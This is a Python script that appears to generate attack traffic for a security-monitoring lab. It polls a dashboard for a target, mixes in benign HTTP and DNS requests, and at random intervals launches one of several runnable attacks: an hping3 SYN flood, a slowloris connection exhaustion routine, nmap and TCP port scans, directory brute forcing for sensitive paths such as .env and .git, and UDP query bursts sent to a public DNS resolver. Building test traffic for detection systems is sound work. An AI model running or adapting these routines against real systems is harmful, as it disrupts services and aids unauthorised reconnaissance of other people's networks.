import os
import time
import threading
import random
import subprocess
import socket
import requests
from datetime import datetime
from dotenv import load_dotenv
from urllib.parse import urlparse

load_dotenv()

DASHBOARD_URL = os.getenv("DASHBOARD_URL", "http://dashboard:5000")

running = True
attack_in_progress = False
current_attack = None
target_url = None
target_host = None
target_port = None

def log(msg):
    print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] {msg}")

def fetch_target():
    global target_url, target_host, target_port
    try:
        r = requests.get(f"{DASHBOARD_URL}/api/target", timeout=3)
        if r.status_code == 200:
            data = r.json()
            url = data.get("url", "")
            if url and url != target_url:
                parsed = urlparse(url)
                target_url = url
                target_host = parsed.hostname or ""
                target_port = parsed.port or (443 if parsed.scheme == "https" else 80)
                log(f"Target updated: {target_url} ({target_host}:{target_port})")
            return url
    except:
        pass
    return ""

def http_get(url):
    try:
        r = requests.get(url, timeout=5, headers={"User-Agent": random.choice(UA_LIST)})
        return r.status_code
    except:
        return 0

def dns_lookup(hostname):
    try:
        socket.gethostbyname(hostname)
        return True
    except:
        return False

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
    "curl/8.4.0",
    "python-requests/2.31.0",
]

def normal_traffic_loop():
    dns_targets = ["google.com", "github.com", "docker.com", "ubuntu.com", "python.org"]
    while running:
        try:
            if target_url:
                for path in ["/", "/index.html", "/api", "/login", "/admin"]:
                    status = http_get(f"{target_url.rstrip('/')}{path}")
                    log(f"Normal HTTP: {path} -> {status}")
                    time.sleep(random.uniform(1, 3))
            for dt in dns_targets:
                dns_lookup(dt)
                time.sleep(random.uniform(0.5, 2))
            if not target_url:
                time.sleep(5)
        except Exception as e:
            log(f"Normal traffic error: {e}")
            time.sleep(5)

def nmap_scan(host):
    log(f"[ATTACK] Starting nmap scan of {host}")
    try:
        result = subprocess.run(
            ["nmap", "-sS", "-sV", "-p", "1-1000", "--min-rate", "500", host],
            capture_output=True, text=True, timeout=120
        )
        log(f"[ATTACK] nmap scan complete: {len(result.stdout.split(chr(10)))} lines")
        return result.stdout
    except subprocess.TimeoutExpired:
        log("[ATTACK] nmap timed out")
        return ""

def syn_flood(host, port):
    log(f"[ATTACK] SYN flood on {host}:{port}")
    try:
        subprocess.run(
            ["hping3", "-S", "--flood", "-p", str(port), host],
            capture_output=True, timeout=15
        )
    except:
        pass
    log("[ATTACK] SYN flood complete")

def http_slowloris(host, port):
    log(f"[ATTACK] Slowloris against {host}:{port}")
    sockets = []
    try:
        for _ in range(50):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, port))
                s.send(b"GET / HTTP/1.1\r\nHost: target\r\n")
                sockets.append(s)
            except:
                break
        log(f"[ATTACK] Slowloris: {len(sockets)} connections open")
        time.sleep(10)
        for s in sockets:
            try:
                s.send(b"X-Forwarded: keep-alive\r\n")
                s.close()
            except:
                pass
    except Exception as e:
        log(f"[ATTACK] Slowloris error: {e}")
    log("[ATTACK] Slowloris complete")

def dns_amplification():
    log(f"[ATTACK] DNS amplification test")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        payload = b"\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01"
        for _ in range(20):
            try:
                sock.sendto(payload, ("8.8.8.8", 53))
            except:
                pass
        sock.close()
    except:
        pass
    log("[ATTACK] DNS amplification test complete")

def arp_spoof_test():
    log("[ATTACK] ARP scan test")
    try:
        subprocess.run(["arp-scan", "--localnet", "--retry", "1"], capture_output=True, timeout=10)
    except:
        pass
    log("[ATTACK] ARP test complete")

def tcp_connect_scan(host, port):
    log(f"[ATTACK] TCP connect scan on {host}:{port}")
    for p in range(1, 500):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect((host, p))
            s.close()
        except:
            pass
    log("[ATTACK] TCP scan complete")

def http_dir_brute(url):
    log(f"[ATTACK] Directory brute force on {url}")
    paths = ["admin", "login", "wp-admin", "config", ".git", "backup", "api", "v1", "secret", "flag", ".env", "dashboard", "uploads"]
    for p in paths:
        try:
            r = requests.get(f"{url.rstrip('/')}/{p}", timeout=2,
                           headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code != 404:
                log(f"[ATTACK] Found: /{p} -> {r.status_code}")
        except:
            pass
        time.sleep(0.1)
    log("[ATTACK] Directory brute force complete")

def attack_scheduler():
    global attack_in_progress, current_attack
    while running:
        if not target_url:
            log("Waiting for target URL...")
            time.sleep(10)
            continue

        attack_interval = random.randint(30, 90)
        log(f"Next attack cycle in {attack_interval}s")
        time.sleep(attack_interval)

        if not running or not target_url:
            continue

        attacks = [
            ("nmap_scan", nmap_scan, [target_host]),
            ("syn_flood", syn_flood, [target_host, target_port]),
            ("slowloris", http_slowloris, [target_host, target_port]),
            ("tcp_scan", tcp_connect_scan, [target_host, target_port]),
            ("dir_brute", http_dir_brute, [target_url]),
            ("dns_amp", dns_amplification, []),
        ]

        attack = random.choice(attacks)
        name, func, args = attack
        attack_in_progress = True
        current_attack = name
        log(f"\n{'='*50}")
        log(f"LAUNCHING ATTACK: {name} on {target_url}")
        log(f"{'='*50}")

        try:
            func(*args)
        except Exception as e:
            log(f"[!] Attack {name} error: {e}")

        attack_in_progress = False
        current_attack = None
        log(f"Attack {name} completed\n")

def target_poll_loop():
    while running:
        fetch_target()
        time.sleep(8)

if __name__ == "__main__":
    log("[+] Traffic Engine starting...")
    time.sleep(10)

    poll_thread = threading.Thread(target=target_poll_loop, daemon=True)
    poll_thread.start()

    normal_thread = threading.Thread(target=normal_traffic_loop, daemon=True)
    normal_thread.start()

    attack_thread = threading.Thread(target=attack_scheduler, daemon=True)
    attack_thread.start()

    try:
        while True:
            time.sleep(60)
            status = f"Target: {target_url or 'not set'}"
            if attack_in_progress:
                status += f", Attack: {current_attack}"
            log(f"Engine heartbeat - {status}")
    except KeyboardInterrupt:
        log("Shutting down...")
        running = False
